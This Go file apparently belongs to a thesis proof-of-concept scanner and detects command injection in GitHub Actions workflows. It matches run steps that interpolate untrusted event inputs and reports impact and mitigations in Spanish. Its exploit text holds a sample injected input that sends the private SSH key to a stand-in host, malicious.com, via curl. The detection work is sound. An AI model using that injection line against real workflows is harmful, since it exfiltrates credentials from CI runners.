package analyzer

import (
	"regexp"
	"strings"

	"github.com/cmalvaceda/tesis-poc/pkg/models"
)

type CommandInjectionDetector struct{}

func NewCommandInjectionDetector() *CommandInjectionDetector {
	return &CommandInjectionDetector{}
}

func (d *CommandInjectionDetector) Detect(filePath string, lines []string, workflowData map[string]interface{}) []models.Vulnerability {
	var vulnerabilities []models.Vulnerability

	unsafeInputPattern := regexp.MustCompile(`run:.*\$\{\{\s*github\.event\.(issue|pull_request|comment|discussion|review|head_ref|inputs|client_payload)\..*\s*\}\}`)

	highRiskPattern := regexp.MustCompile(`run:.*\$\{\{\s*github\.event\.(inputs|client_payload)\..*\s*\}\}`)

	for i, line := range lines {
		if unsafeInputPattern.MatchString(line) && !strings.Contains(line, "${{ github.event.repository") {
			vulnDetails := line
			severity := string(models.SeverityMedium)

			if highRiskPattern.MatchString(line) {
				severity = string(models.SeverityHigh)
			}

			if strings.Contains(line, "||") || strings.Contains(line, "&&") ||
				strings.Contains(line, "\"${{") || strings.Contains(line, "'${{") {
				continue
			}

			impact := "Un atacante podría inyectar comandos arbitrarios que se ejecutarían en el contexto del workflow, " +
				"potencialmente comprometiendo secretos, modificando el repositorio o pivotando a otros sistemas."

			exploit := "Ejemplo de explotación: si el workflow usa `run: echo ${{ github.event.inputs.parameter }}`, " +
				"un atacante podría proporcionar como input: `harmless && curl -d \"$(cat ~/.ssh/id_rsa)\" https://malicious.com`. " +
				"Esto ejecutaría el comando malicioso después del comando legítimo."

			vulnerabilities = append(vulnerabilities, models.Vulnerability{
				Type:        string(models.CommandInjection),
				Description: "Posible inyección de comandos a través de inputs no sanitizados",
				Severity:    severity,
				File:        filePath,
				Line:        i + 1,
				Details:     vulnDetails,
				Impact:      impact,
				Exploit:     exploit,
				Mitigation: "1. Validar y sanitizar estrictamente los inputs antes de usarlos\n" +
					"2. Evitar pasar inputs directamente a comandos shell\n" +
					"3. Usar GitHub Actions inputs con opción 'default' y validación 'required'\n" +
					"4. Considerar el uso de una acción dedicada en lugar de scripts shell para operaciones críticas",
				References: []string{
					"https://docs.github.com/es/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections",
					"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
					"https://github.com/marketplace/actions/create-json-payload - Para manipular datos de forma segura",
					"https://owasp.org/www-community/attacks/Command_Injection",
				},
			})
		}
	}

	return vulnerabilities
}
